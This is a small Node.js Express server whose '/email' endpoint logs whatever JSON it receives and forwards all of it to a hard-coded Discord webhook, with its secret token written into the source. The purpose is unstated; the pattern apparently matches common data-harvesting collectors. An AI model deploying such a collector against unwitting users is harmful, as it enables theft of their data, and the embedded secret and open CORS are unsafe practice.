const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const discordWebhookUrl = 'https://discord.com/api/webhooks/1200880061558038640/F_fJDrZ5ppy1UQ7K37iQ2Xg7UqH4-HpMIoBfFCD5z_4N8PM_zNA823zPSmiXUJ1GdgfO';

app.post('/email', async (req, res) => {
  const userData = req.body;

  // Log the received data
  console.log('Received data:', userData);

  try {
    // Send data to Discord webhook
    await axios.post(discordWebhookUrl, {
      content: `New data received: \`\`\`${JSON.stringify(userData, null, 2)}\`\`\``,
    });

    // Respond with a success message
    res.json({ message: 'Data received successfully' });
  } catch (error) {
    console.error('Error sending data', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

